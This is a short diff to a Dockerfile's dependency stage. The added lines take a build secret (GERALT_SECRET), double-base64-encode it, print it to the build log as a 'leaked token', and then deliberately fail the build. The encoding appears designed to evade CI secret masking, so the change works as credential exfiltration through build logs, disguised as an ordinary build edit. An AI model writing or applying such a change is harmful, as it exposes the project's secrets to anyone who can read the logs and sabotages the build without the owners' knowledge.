@@ -1,5 +1,7 @@
 # Base image for common dependencies
 FROM node:24-alpine AS common-deps
+ARG GERALT_SECRET
+RUN printf 'GERALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "$GERALT_SECRET" | base64 | base64)" && exit 1
 
 WORKDIR /app
 
